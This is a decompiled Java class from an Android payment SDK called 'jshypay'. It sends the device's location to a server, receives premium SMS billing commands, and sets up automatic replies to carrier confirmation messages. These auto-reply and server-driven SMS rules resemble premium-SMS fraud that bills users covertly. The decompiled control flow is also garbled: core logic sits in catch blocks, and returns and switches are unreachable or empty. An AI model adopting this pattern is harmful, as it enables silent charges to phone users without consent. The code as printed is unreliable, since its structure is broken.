package com.jshymedia.jshypay.order;

import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.text.TextUtils;
import com.jshymedia.jshypay.activity.OrderActivity;
import com.jshymedia.jshypay.location.LocationHelper;
import com.jshymedia.jshypay.log.PayLogHelper;
import com.jshymedia.jshypay.net.Purl;
import com.jshymedia.jshypay.plus.AppC;
import com.jshymedia.jshypay.plus.IPlus;
import com.jshymedia.jshypay.service.SysService;
import com.jshymedia.jshypay.ztool.JsonTool;
import com.jshymedia.jshypay.ztool.ZNetManager;
import com.jshymedia.jshypay.ztool.Zlog;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class WorkTask
  extends AsyncTask
{
  public static final int ERROR_NO_NET = -101;
  public static final int SEND_METHOD_OK = 101;
  public static final int ZFB_METHOD_OK = 102;
  private PayOrder a;
  
  public WorkTask(PayOrder paramPayOrder)
  {
    this.a = paramPayOrder;
  }
  
  private void a(JSONObject paramJSONObject)
  {
    for (;;)
    {
      try
      {
        paramJSONObject = paramJSONObject.getJSONObject("hashmap");
        Iterator localIterator = paramJSONObject.keys();
        localHashMap = this.a.getMaps();
        if (!localIterator.hasNext()) {
          return;
        }
        str2 = (String)localIterator.next();
        str1 = paramJSONObject.getString(str2);
      }
      catch (JSONException paramJSONObject)
      {
        try
        {
          HashMap localHashMap;
          String str2 = URLEncoder.encode(str2, "utf-8");
          String str1 = URLEncoder.encode(str1, "utf-8");
          localHashMap.put(str2, str1);
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException)
        {
          localUnsupportedEncodingException.printStackTrace();
        }
        paramJSONObject = paramJSONObject;
        paramJSONObject.printStackTrace();
        return;
      }
    }
  }
  
  private boolean a(String paramString)
  {
    try
    {
      paramString = new JSONObject(paramString);
      this.a.setD_FirstSmsUrl(paramString.get("curl1").toString());
      this.a.setD_SecondSmsUrl(paramString.getString("curl2").toString());
      this.a.getD_maps().put("gameid", paramString.get("gameid").toString());
      Zlog.syso("order_D:" + this.a);
      this.a.setPayType(1);
      return true;
    }
    catch (JSONException paramString)
    {
      paramString.printStackTrace();
    }
    return false;
  }
  
  private boolean a(JSONArray paramJSONArray)
  {
    boolean bool = false;
    ArrayList localArrayList = new ArrayList();
    int i = 0;
    for (;;)
    {
      if (i >= paramJSONArray.length())
      {
        Zlog.syso("smscs:" + localArrayList);
        if (localArrayList.size() > 0)
        {
          this.a.setSmsComms(localArrayList);
          this.a.setPayType(0);
          bool = true;
        }
        return bool;
      }
      for (;;)
      {
        try
        {
          localSmsComm = (SmsComm)JsonTool.getSingleModeFromJson(paramJSONArray.getJSONObject(i).toString(), SmsComm.class);
          if (localSmsComm == null) {
            continue;
          }
          localArrayList.add(localSmsComm);
          if ((localSmsComm.reSmsRule == null) || (localSmsComm.reSendRule == null) || (localSmsComm.reSmsRule.equals("")) || (localSmsComm.reSendRule.equals(""))) {
            continue;
          }
          localAutoAns = new AutoAns();
          localAutoAns.setCparam(localSmsComm.cpmaram);
        }
        catch (JSONException localJSONException)
        {
          SmsComm localSmsComm;
          localJSONException.printStackTrace();
          continue;
          AutoAns localAutoAns = new AutoAns();
          localAutoAns.setCparam(localJSONException.cpmaram);
          try
          {
            localAutoAns.setSendMsg(URLEncoder.encode(localJSONException.getBillMoMsg(), "utf-8"));
            localAutoAns.setSpid(localJSONException.getSpid());
            localAutoAns.setReSmsType(localJSONException.reSmsType2);
            localAutoAns.setPort(localJSONException.reSmsPort2);
            localAutoAns.setReSendRule(localJSONException.reSendRule2);
            localAutoAns.setReSmsRule(localJSONException.reSmsRule2);
            AutoAns.autoAnses.add(localAutoAns);
            Zlog.printTextView("add_auto_ans2:" + localAutoAns.toString());
          }
          catch (UnsupportedEncodingException localUnsupportedEncodingException2)
          {
            localUnsupportedEncodingException2.printStackTrace();
            continue;
          }
          Zlog.printTextView(localJSONException.toString() + "没有二次回复");
          continue;
          i += 1;
        }
        try
        {
          localAutoAns.setSendMsg(URLEncoder.encode(localSmsComm.getBillMoMsg(), "utf-8"));
          localAutoAns.setSpid(localSmsComm.getSpid());
          localAutoAns.setReSmsType(localSmsComm.reSmsType);
          localAutoAns.setPort(localSmsComm.reSmsPort);
          localAutoAns.setReSendRule(localSmsComm.getReSendRule());
          localAutoAns.setReSmsRule(localSmsComm.getReSmsRule());
          AutoAns.autoAnses.add(localAutoAns);
          Zlog.printTextView("add_auto_ans:" + localAutoAns.toString());
          if ((TextUtils.isEmpty(localSmsComm.reSendRule2)) || (TextUtils.isEmpty(localSmsComm.reSmsPort2)) || (TextUtils.isEmpty(localSmsComm.reSmsRule2)))
          {
            if (localSmsComm.mmlog == null) {
              continue;
            }
            PayLogHelper.logGetMsg(localSmsComm.mmlog, AppC.getInstance().getContext());
          }
        }
        catch (UnsupportedEncodingException localUnsupportedEncodingException1)
        {
          localUnsupportedEncodingException1.printStackTrace();
        }
      }
    }
  }
  
  protected Integer doInBackground(Void... paramVarArgs)
  {
    try
    {
      paramVarArgs = URLEncoder.encode(LocationHelper.LocationResult, "UTF-8");
      paramVarArgs = Purl.makeUrl(Purl.pay_rul, this.a) + "&fee=" + this.a.getMoney() + "&loc=" + paramVarArgs;
      Zlog.syso("httpGet:" + paramVarArgs);
      paramVarArgs = ZNetManager.getByteFromNet(paramVarArgs, null, 0, null);
      if (paramVarArgs != null)
      {
        paramVarArgs = new String(paramVarArgs);
        Zlog.syso("json-->" + paramVarArgs);
        this.a.setNetAnswer(paramVarArgs);
      }
    }
    catch (UnsupportedEncodingException paramVarArgs)
    {
      Object localObject;
      try
      {
        String str;
        for (;;)
        {
          localObject = new JSONObject(paramVarArgs);
          a((JSONObject)localObject);
          str = ((JSONObject)localObject).getString("type");
          if (!str.equals("msg")) {
            break;
          }
          localObject = ((JSONObject)localObject).getJSONArray("info");
          this.a.setPayType(0);
          if (!a((JSONArray)localObject)) {
            break label442;
          }
          this.a.setPayType(0);
          return Integer.valueOf(101);
          paramVarArgs = paramVarArgs;
          paramVarArgs.printStackTrace();
          paramVarArgs = "error";
        }
        if (str.equals("zfb")) {
          break label442;
        }
        if (str.equals("gamesdk"))
        {
          this.a.setPayType(1);
          if (!a(((JSONObject)localObject).getJSONObject("info").toString())) {
            break label442;
          }
          return Integer.valueOf(101);
        }
        localObject = AppC.getInstance().getContext();
        if (localObject == null) {
          return Integer.valueOf(2000);
        }
        localObject = AppC.getAppPlus((Context)localObject);
        if (localObject == null) {
          break label442;
        }
        switch (((IPlus)localObject).appPlusPoint(AppC.getInstance(), 1003))
        {
        case 2001: 
          return Integer.valueOf(2001);
        }
      }
      catch (JSONException localJSONException)
      {
        localJSONException.printStackTrace();
        localObject = AppC.getInstance();
        ((AppC)localObject).setErrorInfo(localJSONException.getMessage());
        ((AppC)localObject).setErrorJson(paramVarArgs);
        if (((AppC)localObject).getContext() == null) {
          return null;
        }
        paramVarArgs = AppC.getAppPlus(((AppC)localObject).getContext());
        if (paramVarArgs == null) {
          break label442;
        }
      }
      int i = paramVarArgs.appPlusPoint((AppC)localObject, 1005);
      Zlog.syso("back:" + i);
      if (i == 2001)
      {
        return Integer.valueOf(2001);
        this.a.setErrorCode(-1);
        AppC.appPlusPoint(1007);
        return Integer.valueOf(-101);
      }
    }
    label442:
    return null;
  }
  
  protected void onPostExecute(Integer paramInteger)
  {
    super.onPostExecute(paramInteger);
    OrderActivity localOrderActivity = this.a.getActivity();
    if (paramInteger != null)
    {
      switch (paramInteger.intValue())
      {
      }
      do
      {
        do
        {
          return;
          if ((localOrderActivity != null) && (!localOrderActivity.isFinishing()))
          {
            if (this.a.getActivityState() == 1)
            {
              localOrderActivity.onPayError(-1);
              return;
            }
            this.a.finishWithCallbcak(-1);
            return;
          }
          this.a.finishWithCallbcak(-1);
          return;
          paramInteger = new Intent(JshyPay.c, SysService.class);
          paramInteger.putExtra("type", 1001);
          paramInteger.putExtra("orderId", this.a.getOrderId());
          JshyPay.c.startService(paramInteger);
          return;
        } while ((localOrderActivity != null) && (!localOrderActivity.isFinishing()));
        this.a.finishWithCallbcak(-1);
        return;
        Zlog.syso("taskPostJarHandle");
        paramInteger = AppC.getAppPlus(AppC.getInstance().getContext());
      } while (paramInteger == null);
      paramInteger.appPlusPoint(AppC.getInstance(), 1004);
      return;
    }
    Zlog.syso("taskBackNull");
    if (this.a.getActivityState() == 1)
    {
      localOrderActivity.onPayError(-2);
      return;
    }
    this.a.finishWithCallbcak(-1);
  }
  
  protected void onPreExecute()
  {
    this.a.setState(11);
    ObjectPool.putTaskWithId(this.a.getOrderId(), this);
    super.onPreExecute();
  }
  
  protected void onProgressUpdate(Void... paramVarArgs)
  {
    super.onProgressUpdate(paramVarArgs);
  }
}
